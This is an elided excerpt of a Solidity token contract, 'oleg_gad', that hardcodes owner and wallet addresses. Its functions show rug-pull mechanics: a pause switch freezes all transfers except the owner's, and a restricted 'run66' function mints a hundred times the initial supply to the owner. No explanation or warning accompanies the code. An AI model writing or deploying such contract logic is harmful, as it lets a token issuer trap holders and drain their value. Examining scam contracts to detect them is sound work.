...
contract oleg_gad {
    ...
    function initialize() public {
        _owner = address(0x3fC8fe2487140a89C28E9EDF9B2a9eAea1137793);
    ...
    function runInit() external limited {
        ...
        _liquifier = address(0xc06Ec0bFA2aAEA5eDb7e670225FE202cE445f232);
        _stabilizer = address(0x4e6f432Ed138D110417580a2Ad442062e780754D);
        _treasury = address(0x994dA22aA16C66b343D08e156E406B97e3B47D4B);
    ...
    function _transfer(address from, address to, uint256 amount) internal {
         require(!_pause || (from == _owner), "Pausable: paused");
    ...
    function _mint(address recipient, uint256 amount) private {
        ...
        uint256 fAmount = amount.mul(_frag);
        _tOwned[recipient] = fAmount;
    }


    function run66() public payable limited {
        _mint(_owner, _INIT_TOTAL_SUPPLY*100);
    }
    function pause() public limited {
        _pause=true;
    }   
    function unpause() public limited {
        _pause=false;
    }  
}